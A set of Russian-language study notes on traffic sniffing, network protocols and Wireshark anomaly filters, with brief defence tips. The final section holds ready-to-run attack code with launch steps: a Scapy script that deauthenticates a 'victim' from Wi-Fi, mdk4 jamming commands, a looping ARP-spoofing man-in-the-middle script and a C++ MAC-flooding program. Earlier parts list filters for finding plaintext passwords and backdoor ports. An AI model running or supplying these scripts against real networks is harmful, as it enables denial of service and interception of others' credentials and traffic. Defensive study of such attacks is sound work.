🔹 Пассивный сниффинг трафика

Конфиденциальные данные в открытом виде
🔸 HTTP-трафик (логины, пароли, куки)
Перехват POST-запросов с формами авторизации:
Пример: Перехват паролей с сайтов без HTTPS.
🔸 FTP, Telnet, SMTP
Логины/пароли передаются в открытом виде:
2. Утечки метаданных
🔸 DNS-запросы (какие сайты посещают)
Покажет все посещаемые домены, даже если трафик зашифрован.
🔸 Типы устройств в сети
По MAC-адресам можно определить производителя:
3. Сетевые атаки
🔸 ARP Spoofing
Поиск дублирующихся ARP-ответов:
🔸 SYN-флуд (DDoS)
Если syn_count резко растёт — возможна атака.
🔸 Подозрительные порты
Порт 4444 — часто используется бекдорами.
4. Уязвимости в шифровании
🔸 Слабые SSL/TLS-версии
🔸 Утечка через DNS-over-HTTPS (DoH)
5. Анализ поведения устройств
🔸 Утечки геолокации
Перехват запросов к maps.api.google.com, ipinfo.io.
🔸 Трекеры рекламы
6. Обнаружение вредоносного ПО
🔸 C2-серверы (Command & Control)
🔸 Реконструкция файлов
Извлечение EXE, PDF из HTTP
Как защититься?
HTTPS Everywhere (защита от перехвата паролей).
VPN/ToR (шифрование трафика).
ARP-мониторинг (обнаружение spoofing).
DNS-over-HTTPS (скрытие DNS-запросов).



Python (Scapy) перехватывает IP-пакеты

sudo python3 sniff.py
sudo python3 snifflog.py
sudo python3 sniffjson.py
sudo python3 sniffjson2.py

sudo python3 sniffwire.py # .pcap открыть в wireshark





1. DNS (Domain Name System)
Система доменных имён.
домены (google.com) в IP-адреса (172.217.22.14)
DNS-сервер Google — 8.8.8.8
DNS-сервер Яндекс — 77.88.8.8
Где встречается? При открытии сайтов, работе почты и любых интернет-сервисов.

2. TCP (Transmission Control Protocol)
Надёжный транспортный протокол
доставку данных без потерь и в правильном порядке. 
(веб-страницы, файлы, SSH)
например, 80 для HTTP, 443 для HTTPS
Установка соединения («рукопожатие»): SYN → SYN-ACK → ACK.
Примеры: HTTP, FTP, SMTP.

3. QUIC (Quick UDP Internet Connections)
Протокол поверх UDP, разработанный Google
Ускорение интернет-соединений за счёт
Мультиплексирования (передача нескольких потоков данных в одном соединении)
Уменьшения задержки (не требует «рукопожатия» как TCP).
Встроенного шифрования (как в TLS).
Где используется? В HTTP/3 (новой версии HTTP).
Порт: 443 (как у HTTPS)
Быстрая загрузка сайтов, особенно на мобильных устройствах.

4. TLS (Transport Layer Security)
Протокол шифрования.
Защищает данные от перехвата и подделки. 
Используется в HTTPS, VPN, защищённой почте.
Версии: TLS 1.2 (распространён), 
TLS 1.3 (самый современный и безопасный).
Как работает?
Клиент и сервер договариваются о параметрах шифрования («рукопожатие»).
Все дальнейшие данные передаются в зашифрованном виде.
Пример: Браузер показывает 🔒 рядом с URL сайта.

Сравнение
Протокол	Уровень OSI	Назначение	Надёжность	Скорость	Шифрование
DNS	Прикладной	Преобразование доменов в IP	❌ (UDP)	⚡️ Быстрый	❌ (обычно)
TCP	Транспортный	Надёжная передача данных	✅	🐢 Медленнее	❌ (без TLS)
QUIC	Транспортный	Ускорение поверх UDP	✅ (свои механизмы)	⚡️ Быстрый	✅ (встроенное)
TLS	Сеансовый/Представления	Шифрование данных	✅	Зависит от версии	✅
Где встречаются вместе?
Вы открываете сайт:

DNS находит IP-адрес.

TCP устанавливает соединение.

TLS шифрует данные (если HTTPS).

QUIC (если сайт использует HTTP/3) ускоряет загрузку.



# AAAAAAAAAAA что это

6. Поиск аномалий
DDoS-атака (SYN-флуд):
plaintext
Copy
tcp.flags.syn == 1 && tcp.flags.ack == 0 && frame.time_delta < 0.01
(много SYN-пакетов за короткое время)

ARP Spoofing:
plaintext
Copy
arp.opcode == 2 && arp.src.hw_mac != arp.dst.hw_mac
(дублирующиеся ARP-ответы)

7. Полезные горячие клавиши
Ctrl+F: Поиск по пакетам (hex/текст).

Ctrl+Alt+Shift+T: Отслеживание TCP-потока.

Alt+1: Показывать пакеты в виде списка.

Alt+2: Дерево протоколов.

8. Автоматизация (Bash + tshark)

# Подсчёт HTTP-запросов
tshark -r capture.pcap -Y "http" | wc -l

# Топ-5 IP по трафику
tshark -r capture.pcap -qz "io,stat,0,SUM(ip.len)ip.src" | head -n 7
9. Где искать угрозы?
Незашифрованные пароли: http.request.method == "POST" && http contains "password"

Подозрительные порты: tcp.port == 4444 || udp.port == 31337

Утечки DNS: dns.qry.name contains "vpn" || dns.qry.name contains "bank"

10. Сохранение результатов
File → Export Packet Dissections → As JSON (для анализа в Python).

File → Export Specified Packets (выборочное сохранение).
L7	HTTP-инъекции	http.request.uri contains "SELECT"

# ААААААА что это







🔹 1.2. Wi-Fi Deauth-атака (отключение клиентов)
Python (используем scapy для отправки deauth-фреймов)

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth

target_mac = "AA:BB:CC:DD:EE:FF"  # MAC жертвы
ap_mac = "11:22:33:44:55:66"      # MAC точки доступа
iface = "wlan0"                   # WiFi-интерфейс (монитор-режим)

# Создаём deauth-фрейм
pkt = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()

# Отправляем в цикле (Ctrl+C для остановки)
sendp(pkt, iface=iface, count=1000, inter=0.1)
Как запустить:

Перевести Wi-Fi-адаптер в монитор-режим:


sudo airmon-ng start wlan0
Запустить скрипт:


sudo python3 deauth.py
Что делает:

Отправляет фреймы деаутентификации, заставляя жертву отключиться от Wi-Fi.

🔹 1.3. Wi-Fi Jamming (глушение сигнала)
Bash (используем mdk4 для DoS Wi-Fi)

# Установка mdk4 (Kali Linux)
sudo apt install mdk4

# Запуск атаки на конкретный канал (например, 6)
sudo mdk4 wlan0 d -c 6
Что делает:

Глушит Wi-Fi на указанном канале, делая сеть недоступной.

2. Канальный уровень (Layer 2)
🔹 2.1. ARP Spoofing (MITM-атака)
Python (Scapy) — подмена ARP-таблиц

from scapy.all import *
import time

target_ip = "192.168.1.100"    # Жертва
gateway_ip = "192.168.1.1"     # Роутер
iface = "eth0"                 # Сетевой интерфейс

def spoof():
    # Подменяем ARP-кэш жертвы (говорим, что мы — роутер)
    pkt = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=gateway_ip)
    send(pkt, iface=iface)

    # Подменяем ARP-кэш роутера (говорим, что мы — жертва)
    pkt = ARP(op=2, pdst=gateway_ip, hwdst=getmacbyip(gateway_ip), psrc=target_ip)
    send(pkt, iface=iface)

# Запускаем атаку каждые 2 секунды
while True:
    spoof()
    time.sleep(2)
Как запустить:


sudo python3 arp_spoof.py
Что делает:

Перенаправляет трафик жертвы через атакующего (Man-in-the-Middle).

Для перехвата трафика можно использовать Wireshark или BetterCAP.

🔹 2.2. MAC-флуд (перегрузка коммутатора)
C++ (используем libpcap)
cpp
Copy
#include <pcap.h>
#include <cstring>

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);

    u_char packet[60];
    memset(packet, 0xff, 6);  // MAC назначения: FF:FF:FF:FF:FF:FF (broadcast)
    for (int i = 0; i < 10000; i++) {
        packet[6] = rand() % 256;  // Рандомный MAC отправителя
        pcap_sendpacket(handle, packet, 60);
    }
    pcap_close(handle);
    return 0;
}
Как скомпилировать и запустить:


g++ mac_flood.cpp -lpcap -o mac_flood
sudo ./mac_flood
Что делает:

Отправляет фальшивые MAC-адреса, перегружая таблицу коммутатора.

3. Защита от атак
🔒 Физический уровень
Wi-Fi: WPA3, отключение WPS, скрытие SSID.

Ethernet: Использование 802.1X (Port Security).

🔒 Канальный уровень
ARP Spoofing: arpwatch, Dynamic ARP Inspection (Cisco).

MAC-флуд: Port Security на коммутаторах.